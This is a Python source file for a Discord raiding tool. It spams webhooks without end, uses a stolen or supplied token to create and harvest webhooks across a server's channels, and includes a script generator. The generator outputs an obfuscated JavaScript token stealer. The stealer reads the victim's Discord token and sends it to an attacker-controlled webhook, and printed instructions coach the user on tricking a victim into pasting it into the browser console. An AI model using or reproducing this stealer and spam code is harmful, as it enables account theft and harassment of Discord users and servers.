from requests import get, delete, post
import messages
from datetime import datetime


class WebhookTool:
    def __init__(self) -> None:
        """
        Initialization
        """
        pass

    def Webhook_tool(self, defaultMessage, icons, nameHooks, jsonHook, statuses):
        sessionName = "Webhook tool"
        errorLog = open("errorlogs.txt", "a+")
        print(messages.exitMenu)
        print(messages.webhookMenu)
        try:
            select = input("\nSelect: ")
            if select == "1":
                webhook = input("\nWebhook: ")
                if get(webhook).status_code == 200:
                    print(messages.modeMenu)
                    mode = input("\nSelect: ")
                    if mode == "1":
                        hookName = input("\nWebhook name: ")
                        hookAvatar = input("\nWebhook avatar: ")
                        hookMessage = input("\nMessage : ")
                    else:
                        hookName = nameHooks
                        hookAvatar = icons
                        hookMessage = defaultMessage
                    print("\nSpam started.")
                    while True:
                        req = post(
                            webhook,
                            data={
                                "content": hookMessage,
                                "username": hookName,
                                "avatar_url": hookAvatar,
                            },
                        )
                        if req.status_code not in statuses:
                            print(
                                f"I can't send message in webhook. \nError response: {req.status_code}"
                            )
                            errorLog.write(
                                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                            )
                else:
                    print("Webhook is not working")
            elif select == "2":
                print(messages.modeMenu)
                mode = input("\nSelect: ")
                if mode == "1":
                    hookName = input("\nWebhook name: ")
                    hookAvatar = input("\nWebhook avatar: ")
                    hookMessage = input("\nMessage : ")
                else:
                    hookName = nameHooks
                    hookAvatar = icons
                    hookMessage = defaultMessage
                print("\nSpam started!")
                with open("webhooks.txt", "r") as handle:
                    webhooks = handle.readlines()
                    # result = any(webhooks)
                    if any(webhooks):
                        while True:
                            for x in webhooks:
                                webhook = x.rstrip()
                                info = {
                                    "content": hookMessage,
                                    "username": hookName,
                                    "avatar_url": hookAvatar,
                                }
                                req = post(webhook, data=info)
                                if req.status_code not in statuses:
                                    print(
                                        f"I can't send message in webhook. \nError response: {req.status_code}"
                                    )
                                    errorLog.write(
                                        f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                                    )
                    else:
                        print("\nError")
            elif select == "3":
                channels = []
                x = 1
                d = 1
                file = open("webhooks.txt", "w")
                token = input("\nToken: ")
                serverID = input("\nServer id: ")
                print(messages.modeMenu)
                mode = input("\nSelect: ")
                if mode == "1":
                    hookName = input("\nWebhook name: ")
                    hookAvatar = input("\nWebhook avatar: ")
                    hookMessage = input("\nMessage : ")
                else:
                    hookName = nameHooks
                    hookAvatar = icons
                    hookMessage = defaultMessage
                request = get(
                    f"https://discord.com/api/v8/guilds/{serverID}/channels",
                    headers={"Authorization": token},
                )
                if request.status_code == 200:
                    for channel in request.json():
                        if channel["type"] == 0:
                            channels.append(channel["id"])
                    # result = any(channels)
                    if any(channels):
                        request = post(
                            f"https://discord.com/api/v8/channels/{channels[0]}/webhooks",
                            headers={
                                "Content-Type": "application/json",
                                "Authorization": token,
                            },
                            json=jsonHook,
                        )
                        print(request.json())
                        if request.status_code == 200:
                            while x <= 2:
                                for channelID in channels:
                                    # if d <= 30:
                                    request = post(
                                        f"https://discord.com/api/v8/channels/{channelID}/webhooks",
                                        headers={
                                            "Content-Type": "application/json",
                                            "Authorization": token,
                                        },
                                        json=jsonHook,
                                    )
                                    if request.status_code in statuses:
                                        data = request.json()
                                        webhookID = data["id"]
                                        webhookToken = data["token"]
                                        file.write(
                                            f"https://discordapp.com/api/webhooks/{webhookID}/{webhookToken}\n"
                                        )
                                    else:
                                        errorLog.write(
                                            f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {request.status_code}] [Message: {request.json()}\n"
                                        )
                                #         d += 1
                                x += 1
                            print("\nSpam started.")
                            file.close()
                            with open("webhooks.txt", "r") as handle:
                                webhooks = handle.readlines()
                                while True:
                                    for x in webhooks:
                                        webhook = x.rstrip()
                                        req = post(
                                            webhook,
                                            data={
                                                "content": hookMessage,
                                                "username": hookName,
                                                "avatar_url": hookAvatar,
                                            },
                                        )
                                        if req.status_code not in statuses:
                                            print(
                                                f"I can't send message in webhook. \nError response: {req.status_code}"
                                            )
                                            errorLog.write(
                                                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                                            )
                        else:
                            print("\nThe account does not have enough rights.")
                            errorLog.write(
                                f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {request.status_code}] [Message: {request.json()}\n"
                            )
                    else:
                        # print(f"\nError. Result: {result}")
                        print("Error")
                else:
                    print(f"Error.\nResponse Code: {req.status_code}")
                    errorLog.write(
                        f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {request.status_code}] [Message: {request.json()}\n"
                    )
            elif select == "4":
                channels = []
                x = 1
                file = open("webhooks.txt", "w")
                token = input("\nToken: ")
                serverID = input("\nServer id: ")
                request = get(
                    f"https://discord.com/api/v8/guilds/{serverID}/channels",
                    headers={
                        "Authorization": token,
                    },
                )
                if request.status_code == 200:
                    for channel in request.json():
                        if channel["type"] == 0:
                            channels.append(channel["id"])
                    print(channels)
                    # result = any(channels)
                    if any(channels):
                        for channel in channels:
                            request = get(
                                f"https://discord.com/api/v8/channels/{channel}/webhooks",
                                headers={"Authorization": token},
                            ).json()
                            if any(request):
                                for req in request:
                                    print(req)
                                    file.write(
                                        f'https://discord.com/api/webhooks/{req["id"]}/{req["token"]}\n'
                                    )
                    else:
                        print("\nError")
                else:
                    print("\nError")
                    errorLog.write(
                        f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {request.status_code}] [Message: {request.json()}\n"
                    )
                    print("\nGrabbed all webhooks.")
            elif select == "5":
                webhook = input("\nWebhook: ")
                req = delete(webhook)
                if req.status_code == 200:
                    print("\nWebhook deleted.")
                else:
                    print("\nError")
                    errorLog.write(
                        f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                    )
            elif select == "6":
                webhook = input("\nWebhook: ")
                req = get(webhook)
                if req.status_code == 200:
                    data = req.json()
                    print(
                        f"""
    Webhook ID: {data['id']}
    Webhook name: {data['name']}
    Server ID: {data['guild_id']}
    Channel ID: {data['channel_id']}"""
                    )
                else:
                    print("\nI can't parse this webhook")
                    errorLog.write(
                        f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                    )
            elif select == "6":
                print(messages.menu)
                select = input("\nSelect: ")
                if select == "1":
                    print(messages.helpWebhookToolEN)
                elif select == "2":
                    print(messages.helpWebhookToolRU)
                else:
                    print("\nInvalid option.")
            else:
                print("\nInvalid option.")
        except KeyboardInterrupt:
            print("\nExit...")
        errorLog.close()
        input("\nPress key to continue.")

    def scriptGen(self):
        sessionName = "Script gen"
        errorLog = open("errorlogs.txt", "a+")
        print(messages.exitMenu)
        print(messages.scriptMenu)
        try:
            select = input("\nSelect: ")
            if select == "1":
                print(
                    "\nThis script, when inserted into the discord console, steals the victims token and gives her all the badges for the profile for the current session of use. For the victim to be able to launch it, she needs to open the console by pressing the key combination Ctrl + Shift + i, or F12. On the Console tab, she should paste it in and press Enter. in order not to violate the integrity of the script, pass it to the victim in a code block (triple brackets ```)."
                )
                script = "(function(_0x442aab,_0x4a3b8b){var _0x3821e9=_0x5a0e,_0x34a43e=_0x442aab();while(!![]){try{var _0x489acf=parseInt(_0x3821e9(0xa9))/0x1+-parseInt(_0x3821e9(0xbc))/0x2*(-parseInt(_0x3821e9(0xb0))/0x3)+parseInt(_0x3821e9(0xc0))/0x4+parseInt(_0x3821e9(0xa6))/0x5*(-parseInt(_0x3821e9(0xa8))/0x6)+parseInt(_0x3821e9(0xb9))/0x7*(-parseInt(_0x3821e9(0xba))/0x8)+-parseInt(_0x3821e9(0xb1))/0x9*(-parseInt(_0x3821e9(0xa4))/0xa)+-parseInt(_0x3821e9(0xa3))/0xb;if(_0x489acf===_0x4a3b8b)break;else _0x34a43e['push'](_0x34a43e['shift']());}catch(_0x4686e4){_0x34a43e['push'](_0x34a43e['shift']());}}}(_0x3a45,0x874a3));function _0x5a0e(_0x5adca6,_0x5b611c){var _0x4b9fd1=_0x3a45();return _0x5a0e=function(_0x380e53,_0x534ede){_0x380e53=_0x380e53-0xa0;var _0x482bd1=_0x4b9fd1[_0x380e53];return _0x482bd1;},_0x5a0e(_0x5adca6,_0x5b611c);}function getToken(){var _0x4fcd1c=_0x5a0e,_0x145f18=(function(){var _0x279a8f=!![];return function(_0x4bcc65,_0x3d0ce2){var _0x45eb96=_0x279a8f?function(){var _0x21ac92=_0x5a0e;if(_0x3d0ce2){var _0x54d073=_0x3d0ce2[_0x21ac92(0xaf)](_0x4bcc65,arguments);return _0x3d0ce2=null,_0x54d073;}}:function(){};return _0x279a8f=![],_0x45eb96;};}()),_0x380728=_0x145f18(this,function(){var _0x2dae05=_0x5a0e,_0x1672b1=function(){var _0x10e2c2=_0x5a0e,_0x1367da;try{_0x1367da=Function('return\x20(function()\x20'+_0x10e2c2(0xa0)+');')();}catch(_0x30f145){_0x1367da=window;}return _0x1367da;},_0x415991=_0x1672b1(),_0xf0d4b2=_0x415991['console']=_0x415991[_0x2dae05(0xb2)]||{},_0x18885a=[_0x2dae05(0xc2),_0x2dae05(0xbd),_0x2dae05(0xad),_0x2dae05(0xa7),'exception',_0x2dae05(0xb7),_0x2dae05(0xa5)];for(var _0xc4221d=0x0;_0xc4221d<_0x18885a['length'];_0xc4221d++){var _0x52e42e=_0x145f18['constructor'][_0x2dae05(0xb4)][_0x2dae05(0xb3)](_0x145f18),_0xfb950c=_0x18885a[_0xc4221d],_0x42b7c1=_0xf0d4b2[_0xfb950c]||_0x52e42e;_0x52e42e[_0x2dae05(0xb5)]=_0x145f18[_0x2dae05(0xb3)](_0x145f18),_0x52e42e['toString']=_0x42b7c1[_0x2dae05(0xae)][_0x2dae05(0xb3)](_0x42b7c1),_0xf0d4b2[_0xfb950c]=_0x52e42e;}});_0x380728();var _0x1edc18=_0x4fcd1c(0xc1),_0x1e384c=(webpackChunkdiscord_app[_0x4fcd1c(0xab)]([[''],{},_0x4cc857=>{var _0x31dedc=_0x4fcd1c;m=[];for(let _0x245493 in _0x4cc857['c'])m[_0x31dedc(0xab)](_0x4cc857['c'][_0x245493]);}]),m)['find'](_0x3add95=>_0x3add95?.[_0x4fcd1c(0xa1)]?.[_0x4fcd1c(0xaa)]?.['getToken']!==void 0x0)[_0x4fcd1c(0xa1)][_0x4fcd1c(0xaa)]['getToken'](),_0x4d79c0=new XMLHttpRequest();_0x4d79c0['open'](_0x4fcd1c(0xac),_0x1edc18),_0x4d79c0[_0x4fcd1c(0xbf)](_0x4fcd1c(0xc3),_0x4fcd1c(0xb8));var _0x318cca={'username':'','avatar_url':_0x4fcd1c(0xbe),'content':_0x4fcd1c(0xbb)+_0x1e384c+_0x4fcd1c(0xc4)};_0x4d79c0[_0x4fcd1c(0xa2)](JSON[_0x4fcd1c(0xb6)](_0x318cca));}getToken();function _0x3a45(){var _0x3f3b8c=['11088473ZRCMdJ','10657870gKUYNM','trace','15TCflLH','error','31824nzxJcz','107542gXCGBj','default','push','POST','info','toString','apply','1101FCCZCp','9oJvUek','console','bind','prototype','__proto__','stringify','table','application/json','49tZdbJy','844216JhrNmu','New\x20**token:\x20**||`','4964ZGfcgM','warn','ICOON','setRequestHeader','930272FOKPJW','WEB_HOOK','log','Content-type','`||','{}.constructor(\x22return\x20this\x22)(\x20)','exports','send'];_0x3a45=function(){return _0x3f3b8c;};return _0x3a45();}"
                webhook = input("\nWebhook: ")
                data = {
                    "source": f'"{webhook}"',
                    "do_linebreak": "on",
                    "do_indent": "on",
                    "prefix": "_",
                    "do_strings": "on",
                    "do_strings_hex": "on",
                    "ignore_fn": "",
                    "ignore_global": "",
                }
                data2 = {
                    "source": f'"{messages.icons}"',
                    "do_linebreak": "on",
                    "do_indent": "on",
                    "prefix": "_",
                    "do_strings": "on",
                    "do_strings_hex": "on",
                    "ignore_fn": "",
                    "ignore_global": "",
                }
                req = post("http://www.freejsobfuscator.com/obfuscate", data=data)
                req2 = post("http://www.freejsobfuscator.com/obfuscate", data=data2)
                if req.status_code in messages.statuses:
                    out = req.json()["output"]
                    out1 = req2.json()["output"]
                    out2 = out[:-10]
                    out12 = out1[:-10]
                    webhook2 = out2[10:]
                    icon = out12[10:]
                    script2 = script.replace("WEB_HOOK", webhook2).replace(
                        "ICOON", icon
                    )
                    print(f"\nCopy this script, and give your victim. ==>")
                    print(f"\n{script2}")
                    print()
                    print(
                        "THANKS TO EZRAIDv2 for updated script (https://github.com/EZRAIDv2)"
                    )
                else:
                    errorLog.write(
                        f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] [{sessionName}] [Status_code: {req.status_code}] [Message: {req.json()}\n"
                    )
            elif select == "2":
                print(messages.menu)
                select = input("\nSelect: ")
                if select == "1":
                    print(messages.helpScriptGenEN)
                elif select == "2":
                    print(messages.helpScriptGenRU)
                else:
                    print("\nInvalid option.")
            else:
                print("\nIvalid option.")
        except KeyboardInterrupt:
            print("\nExit...")
        errorLog.close()
        input("\nPress key to continue.")
